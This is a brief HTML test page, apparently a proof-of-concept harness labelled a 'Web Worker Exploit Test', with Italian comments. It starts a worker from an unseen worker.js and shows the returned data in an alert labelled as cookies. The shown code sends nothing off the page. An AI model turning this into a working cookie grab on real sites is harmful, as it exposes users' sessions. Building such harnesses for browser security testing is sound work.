<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Worker Exploit Test</title>
</head>
<body>
    <h1>Testing Web Worker Exploit</h1>
    <script>
        // Controlla se il browser supporta i Web Workers
        if (window.Worker) {
            // Crea un nuovo Web Worker e specifica il file worker.js
            const myWorker = new Worker('worker.js');

            // Definisce la funzione per gestire i messaggi ricevuti dal Web Worker
            myWorker.onmessage = function(e) {
                console.log('Message received from worker', e.data);
                alert('Cookies: ' + e.data);
            };

            // Invia un messaggio al Web Worker per avviare il processo
            myWorker.postMessage('Start');
        } else {
            console.log('Your browser doesn\'t support web workers.');
        }
    </script>
</body>
</html>
